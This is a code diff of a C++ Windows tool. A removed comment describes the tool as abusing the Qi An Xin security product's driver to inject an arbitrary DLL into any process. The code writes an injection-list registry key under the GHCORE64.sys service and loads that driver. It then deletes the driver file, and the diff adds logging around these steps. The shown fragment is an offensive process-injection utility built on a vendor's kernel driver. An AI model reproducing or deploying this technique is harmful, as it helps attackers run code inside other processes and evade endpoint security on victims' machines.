@@ -1,10 +1,4 @@
-﻿/*
-*
-* 利用奇安信的驱动注入任意到DLL到任意进程
-*
-*
-*/
-#include <windows.h>
+﻿#include <windows.h>
 #include <iostream>
 #include <filesystem>
 #include <fstream>
@@ -15,9 +9,10 @@ using namespace std;
 
 int _cdecl wmain(int argc, wchar_t* argv[])
 {
-    if (argc < 2)
-        return 0;
-    
+  if (argc < 2) {
+    wcout << "[-] need param\n";
+    return 0;
+  }  
     bool isloadorunload; //load
     wcout << "[+] " << argv[1] << endl;
     if (!_wcsicmp(argv[1], L"-i"))
@@ -47,9 +42,8 @@ int _cdecl wmain(int argc, wchar_t* argv[])
     wstring servicekey = L"SYSTEM\\CurrentControlSet\\Services\\";
     HKEY okey;
 
-    //将要注入的DLL写入注入表
+    // 将要注入的DLL写入注入表
     LSTATUS s = RegCreateKeyW(HKEY_LOCAL_MACHINE, (servicekey + L"GHCORE64.sys").c_str(), &okey);
-    //LSTATUS s = RegOpenKeyW(HKEY_LOCAL_MACHINE, (servicekey + L"GHCORE64.sys").c_str(), &okey);
     if (s != ERROR_SUCCESS) {
         wcout << "[+] RegCreateKeyW GHCORE64.sys failed\n";
         return 0;
@@ -89,11 +83,12 @@ int _cdecl wmain(int argc, wchar_t* argv[])
     
     //写入自己的DLL的路径
 
-
     bool load = service::RegisterAndStart(driver_path);
     if (load)
         wcout << "[+] Driver loading success\n";
-    filesystem::remove(driver_path);
+    wcout << "[+] delete drive " << driver_path << endl;
+    bool is_removed = filesystem::remove(driver_path);
+    if (!is_removed) wcout << "[+] driver not removed\n";
 
     return 0;
 }
